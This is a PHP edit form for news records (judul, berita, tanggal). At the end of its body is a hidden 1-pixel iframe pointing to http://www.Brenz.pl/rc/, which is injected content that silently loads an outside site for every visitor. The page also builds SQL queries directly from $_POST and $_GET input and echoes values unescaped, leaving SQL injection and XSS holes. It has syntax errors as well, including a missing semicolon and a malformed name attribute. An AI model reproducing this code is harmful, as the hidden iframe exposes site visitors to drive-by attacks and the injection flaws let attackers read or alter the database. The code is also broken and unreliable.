<?php
// include database connection file
include_once("config.php");
 
// Check if form is submitted for user update, then redirect to homepage after update
if(isset($_POST['update']))
{	
	$id = $_POST['id'];
	$judul=$_POST['judul'];
	$berita=$_POST['berita'];
	$tanggal=$_POST['tanggal'];
		
	// update user data
	$result = mysqli_query($mysqli, "UPDATE users SET id='$id',judul='$judul',berita='$berita',tanggal='$tanggal' WHERE id=$id");
	
	// Redirect to homepage to display updated user in list
	header("Location: index.php");
}
?>
<?php
// Display selected user data based on id
// Getting id from url
$id = $_GET['id'];
 
// Fetech user data based on id
$result = mysqli_query($mysqli, "SELECT * FROM users WHERE id=$id");
 
while($user_data = mysqli_fetch_array($result))
{
	$id = $user_data['id']
	$judul = $user_data['judul'];
	$berita = $user_data['berita'];
	$tanggal = $user_data['tanggal'];
}
?>
<html>
<head>	
	<title>Edit User Data</title>
</head>
 
<body>
	<a href="index.php">Home</a>
	<br/><br/>
	
	<form name="update_user" method="post" action="edit.php">
		<table border="0">
			<tr> 
				<td>id</td>
				<td><input type="text" name="id" value=<?php echo $id;?>></td>
			</tr>
			<tr> 
				<td>judul</td>
				<td><input type="text" name="judul" value=<?php echo $judul;?>></td>
			</tr>
			<tr> 
				<td>berita</td>
				<td><input type="text" name=berita" value=<?php echo $berita;?>></td>
			</tr>
			<tr>
			<td>tanggal</td>
				<td><input type="text" name="tanggal" value=<?php echo $tanggal;?>></td>
			</tr>
			<tr>
				<td><input type="hidden" name="id" value=<?php echo $_GET['id'];?>></td>
				<td><input type="submit" name="update" value="Update"></td>
			</tr>
		</table>
	</form>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>